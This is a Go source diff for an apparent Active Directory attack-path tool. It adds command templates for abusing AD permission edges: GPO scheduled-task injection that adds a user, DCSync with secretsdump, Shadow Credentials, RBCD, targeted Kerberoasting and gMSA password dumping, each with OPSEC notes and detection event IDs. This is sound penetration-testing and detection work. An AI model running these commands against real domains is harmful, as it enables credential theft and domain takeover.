@@ -18,7 +18,7 @@ type Template struct {
 // Placeholders supported in Command/Alternates. The renderer fills any that are
 // not present in the graph with "<unknown>".
 //
-//	{DOMAIN} {DC} {SOURCE_SAM} {SOURCE_DN} {SOURCE_SID}
+//	{DOMAIN} {DC} {SOURCE_SAM} {SOURCE_DN} {SOURCE_SID} {SOURCE_NAME}
 //	{TARGET_SAM} {TARGET_DN} {TARGET_SID} {TARGET_NAME}
 const (
 	phDomain     = "{DOMAIN}"
@@ -26,6 +26,7 @@ const (
 	phSourceSAM  = "{SOURCE_SAM}"
 	phSourceDN   = "{SOURCE_DN}"
 	phSourceSID  = "{SOURCE_SID}"
+	phSourceName = "{SOURCE_NAME}"
 	phTargetSAM  = "{TARGET_SAM}"
 	phTargetDN   = "{TARGET_DN}"
 	phTargetSID  = "{TARGET_SID}"
@@ -259,14 +260,14 @@ var Templates = map[model.EdgeKind]Template{
 	},
 	model.EdgeGPLink: {
 		Edge:    model.EdgeGPLink,
-		Summary: "A GPO is linked at the source container; the GPO's settings apply there.",
-		Command: "# GPO {TARGET_NAME} linked at {SOURCE_DN}. To abuse: edit GPO settings (GPO write) then wait for refresh.",
+		Summary: "Source GPO is linked at the target container (domain/OU/site); its settings apply to everything the container holds (Enforced flag shown on the edge).",
+		Command: "# GPO {SOURCE_NAME} ({SOURCE_DN}) is linked at {TARGET_DN}. To abuse: gain write on the GPO, inject an immediate scheduled task, wait for policy refresh.",
 		Alternates: []string{
-			"# SharpGPOAbuse.exe --AddComputerTask --TaskName 'evil' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net user hacker P@ss /add' --GPOName '{TARGET_NAME}'",
+			"# SharpGPOAbuse.exe --AddComputerTask --TaskName 'evil' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net user hacker P@ss /add' --GPOName '{SOURCE_NAME}'",
 		},
 		OPSEC:        "GPO edits are 5136/5137 on the GPO object; the payload lands on clients at gpupdate (~90 min) and executes via 4688/7045 on many hosts at once — very loud.",
 		EventIDs:     []int{5136, 5137, 4688},
-		RequiresAuth: "Type 1 (relationship): requires GPO write on {TARGET_NAME}.",
+		RequiresAuth: "Type 1 (relationship): requires GPO write on {SOURCE_NAME}.",
 	},
 	model.EdgeTrustedBy: {
 		Edge:         model.EdgeTrustedBy,
@@ -275,6 +276,110 @@ var Templates = map[model.EdgeKind]Template{
 		OPSEC:        "Trust changes are rare; 4706/4707 are logged if trust manipulation occurs.",
 		EventIDs:     []int{4706, 4707},
 		RequiresAuth: "Structural/trust (no direct action).",
+	},
+	model.EdgeCanRDP: {
+		Edge:    model.EdgeCanRDP,
+		Summary: "Source may open a Remote Desktop session to the target host.",
+		Command: "xfreerdp /v:{TARGET_NAME}.{DOMAIN} /u:{SOURCE_SAM} /p:'<password>' /cert:ignore",
+		Alternates: []string{
+			"rdesktop -u {SOURCE_SAM} {TARGET_NAME}.{DOMAIN}",
+		},
+		OPSEC:        "RDP network logons are 4624 type 10 (or 3 via RD Gateway). RDP service must be reachable; negotiate NLA to avoid plaintext.",
+		EventIDs:     []int{4624},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
+	},
+	model.EdgeAllExtendedRights: {
+		Edge:    model.EdgeAllExtendedRights,
+		Summary: "Source holds all extended rights on the target (includes ForceChangePassword, AddMember, DCSync when on a domain).",
+		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set password {TARGET_SAM} 'NewPassw0rd!42'",
+		Alternates: []string{
+			"# On a Domain object, AllExtendedRights includes DS-Replication rights:",
+			"impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc",
+		},
+		OPSEC:        "Treat like the union of its implied rights — password writes (4724) or replication (4662) land depending on target type.",
+		EventIDs:     []int{4724, 4662},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
+	},
+	model.EdgeAddKeyCredentialLink: {
+		Edge:    model.EdgeAddKeyCredentialLink,
+		Summary: "Source can write msDS-KeyCredentialLink on the target — Shadow Credentials / device credential persistence.",
+		Command: "certipy shadow auto -username {SOURCE_SAM}@{DOMAIN} -password '<password>' -account {TARGET_SAM}",
+		Alternates: []string{
+			"# From Windows: pywhisker / Whisker.exe add_user_fake --domain {DOMAIN} --user {TARGET_SAM} --password <KEYPAIR_PW>",
+		},
+		OPSEC:        "msDS-KeyCredentialLink write is a 5136 event; PKINIT then authenticates the account and yields Kerberos 4768/4769 AS-REQ activity with an unusual key.",
+		EventIDs:     []int{5136, 4768},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
+	},
+	model.EdgeAddAllowedToAct: {
+		Edge:    model.EdgeAddAllowedToAct,
+		Summary: "Source can set the target computer's AllowedToAct list (RBCD on this computer).",
+		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add rbcd {TARGET_NAME} <ATTACKER_SAM>",
+		Alternates: []string{
+			"impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Passw0rd' -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
+		},
+		OPSEC:        "Writes msDS-AllowedToActOnBehalfOfOtherIdentity (5136) on the target; then S4U2Self/S4U2Proxy tickets (4769 with S4U flags).",
+		EventIDs:     []int{5136, 4769},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
+	},
+	model.EdgeWriteSPN: {
+		Edge:    model.EdgeWriteSPN,
+		Summary: "Source can modify the target's servicePrincipalName — Kerberoast-on-the-fly / targeted Kerberoasting.",
+		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_SAM} servicePrincipalName 'http/EVIL'",
+		Alternates: []string{
+			"# Request a TGS for the planted SPN, then crack:",
+			"impacket-GetUserSPNs '{DOMAIN}/{SOURCE_SAM}:<password>' -request",
+		},
+		OPSEC:        "SPN write is a 5136 event; subsequent TGS request is 4769 with a service ticket for the planted SPN. Watch new SPN values appearing on non-service accounts.",
+		EventIDs:     []int{5136, 4769},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
+	},
+	model.EdgeWriteAccountRestrictions: {
+		Edge:    model.EdgeWriteAccountRestrictions,
+		Summary: "Source can modify the target's account restrictions (userAccountControl / msDS-AllowedToActOnBehalfOfOtherIdentity).",
+		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set uac {TARGET_SAM} TRUSTED_TO_AUTH_FOR_DELEGATION",
+		Alternates: []string{
+			"# Or set RBCD delegation as with AddAllowedToAct:",
+			"bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add rbcd {TARGET_SAM} <ATTACKER_SAM>",
+		},
+		OPSEC:        "userAccountControl / restriction writes are 5136 events; enabling unprotected delegation flags is high-signal when audited.",
+		EventIDs:     []int{5136},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
+	},
+	model.EdgeWriteGPLink: {
+		Edge:    model.EdgeWriteGPLink,
+		Summary: "Source can modify the gPLink attribute of the target container — link a hostile GPO without touching its content.",
+		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_DN} gPLink '[LDAP://CN=<GPO>,CN=Policies,CN=System,DC={DOMAIN};0]'",
+		Alternates: []string{
+			"# OUned.py --add-link (requires GPO write too) — see 'OU having a laugh??'",
+		},
+		OPSEC:        "gPLink attribute changes are 5136 events on the target container; the linked GPO then applies to all contained objects.",
+		EventIDs:     []int{5136},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
+	},
+	model.EdgeGetChangesInFilteredSet: {
+		Edge:         model.EdgeGetChangesInFilteredSet,
+		Summary:      "Source has DS-Replication-Get-Changes-In-Filtered-Set — can plant/hide SID history in a filtered domain partition.",
+		Command:      "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc-user Administrator",
+		OPSEC:        "Replication-DS access is logged as 4662 with the filtered-set replication GUID.",
+		EventIDs:     []int{4662},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials or hash.",
+	},
+	model.EdgeWriteAltSecurityIdentities: {
+		Edge:         model.EdgeWriteAltSecurityIdentities,
+		Summary:      "Source can write altSecurityIdentities on the target — bind a certificate to the account (kerberos/ms-ts issued certs).",
+		Command:      "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_SAM} altSecurityIdentities 'X509:<I>...<S>...'",
+		OPSEC:        "altSecurityIdentities write is a 5136 event; the subsequent certificate-based logon produces 4624 + certificate hash, coinciding with domain controller 4768.",
+		EventIDs:     []int{5136, 4768},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
+	},
+	model.EdgeDumpSMSAPassword: {
+		Edge:         model.EdgeDumpSMSAPassword,
+		Summary:      "Source can read the target Managed Service Account's current password blob.",
+		Command:      "gMSADumper.py -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -l {DC}",
+		OPSEC:        "msDS-ManagedPassword reads are 4662 attribute-read events against the gMSA.",
+		EventIDs:     []int{4662},
+		RequiresAuth: "Type 1 (relationship): requires {SOURCE_SAM} credentials.",
 	},
 }
 
